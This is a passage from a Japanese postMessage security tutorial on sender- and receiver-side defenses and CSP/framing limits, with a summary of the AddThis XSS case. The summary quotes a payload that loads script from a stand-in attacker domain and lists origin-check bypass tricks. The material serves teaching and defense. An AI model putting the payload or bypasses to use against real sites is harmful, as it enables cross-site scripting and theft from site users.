4. **`targetOrigin` にワイルドカード `'*'` を使わない。** 送り先が確定しているなら、必ず具体的オリジンを書く。これにより、配達先窓のオリジンが攻撃者に差し替えられていても、意図しないオリジンへは配達されず、機密データの漏洩を防げる。

   ```javascript
   childWindow.postMessage(payload, "https://trusted.example.com");  // '*' にしない
   ```

#### 多層防御（フレーム/CSP）

5. **クリックジャッキング/埋め込み対策も併用する。** `X-Frame-Options: DENY`（または `SAMEORIGIN`）と CSP の `frame-ancestors` で、意図しないサイトからの埋め込みを禁止する。ただしこれは `window.open` 経由の攻撃までは防げないため、あくまで受信側の厳密なオリジン検証と組み合わせる補助策と位置づける。
6. **CSPを適切に絞る。** `script-src` から `'unsafe-eval'` と `'unsafe-inline'` を排除し、万一sinkにデータが届いても実行されにくくする。CSPは最後の安全網であって、オリジン検証の代わりにはならない。

要するに、postMessage防御の一丁目一番地は **「受信側で送信元オリジンを完全一致の許可リストで検証し、`event.data` の形を検証し、危険なsinkを避ける」** の三点セットであり、送信側の `targetOrigin` 明示とCSP/フレーム制限がそれを補強します。AddThisの事例が示したのは、この三点のうち最初の一点（厳密なオリジン検証）を怠っただけで、100万サイトが一斉にXSSへ転落したという事実です。

> 出典: postMessage脆弱性入門（YesWeHack、防御策とベストプラクティス） — https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> 出典: postMessage XSS on a million sites（Detectify Labs、第三者スクリプト精査の教訓） — https://labs.detectify.com/writeups/postmessage-xss-on-a-million-sites/
> 出典: postMessage脆弱性の高度な連鎖（Intigriti、防御の総合） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities

---

### この節のまとめ

- `postMessage` はSOPの壁を越えて安全に通信するためのAPIだが、**受信側が `event.origin` を検証しない／甘く検証する**と、攻撃者が任意の `event.data`（taint source）をsinkへ流し込めてDOM XSSになる。
- 送信側の `targetOrigin='*'` は情報漏洩を、受信側のsink（`innerHTML`/`eval`/`document.write`/`location`）への無防備な代入はコード実行を招く。
- **AddThis事例（2016, 100万サイト）** は、オリジン検証を「HTTP/HTTPSであること」だけに省略した結果、`at-share-bookmarklet://ATTACKERDOMAIN/xss.js` 一撃で全サイトがXSS可能になった、第三者スクリプトの怖さの象徴。
- オリジン検証バイパスは、`indexOf`の部分一致、`search()`/正規表現の `.` ワイルドカード、`startsWith`/`endsWith` の境界無視、サンドボックスiframeの `null` オリジン、iframe削除による `e.source` の `null` 化、`File`/`Error` を使った `escapeHtml` 回避——いずれも**言語仕様やブラウザ挙動の意味論のズレ**を突いている。
- 高度な実戦では、**プロトタイプ汚染（`__proto__` 注入）** や **CSPの `unsafe-eval`** と連鎖してXSSに到達する。
- 防御の核心は「**受信側で完全一致の許可リストによるオリジン検証＋データ形式検証＋危険なsink回避**」。サニタイザに頼る場合はバージョン依存の回避手法に注意する。
